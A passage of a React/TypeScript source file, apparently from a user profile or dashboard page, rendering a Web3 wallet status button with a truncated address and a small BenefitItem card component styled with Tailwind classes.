                  <div className="text-left">
                    <p className="text-[13px] font-bold text-slate-900 dark:text-white">Web3 Wallet</p>
                    <p className={`text-[11px] font-medium mt-0.5 truncate w-32 ${userData.web3Wallet ? 'text-[#38bdf8]' : userData.web3Status === 'pending' ? 'text-amber-500' : 'text-slate-500'}`}>
                      {userData.web3Wallet ? `${userData.web3Wallet.slice(0, 6)}...${userData.web3Wallet.slice(-4)}` : userData.web3Status === 'pending' ? "In Review" : "Not Connected"}
                    </p>
                  </div>
                </div>
                <ArrowUpRight className="w-4 h-4 text-slate-400 group-hover:text-slate-900 dark:group-hover:text-white transition-colors" />
              </button>

            </div>
          </div>

        </div>
      </div>
    </div>
  );
}

function BenefitItem({ icon: Icon, title, desc }: { icon: any, title: string, desc: string }) {
  return (
    <div className="flex items-center gap-4 p-3 rounded-2xl bg-slate-50 dark:bg-white/[0.02] border border-slate-100 dark:border-white/[0.04]">
      <div className="w-8 h-8 rounded-full bg-white dark:bg-[#0A0A0C] border border-slate-200 dark:border-white/10 flex items-center justify-center shrink-0 shadow-sm">
        <Icon className="w-4 h-4 text-slate-700 dark:text-slate-300" />
      </div>
      <div>
        <p className="text-[13px] font-bold text-slate-900 dark:text-white">{title}</p>
        <p className="text-[11px] text-slate-500 mt-0.5">{desc}</p>
      </div>
    </div>
  );
}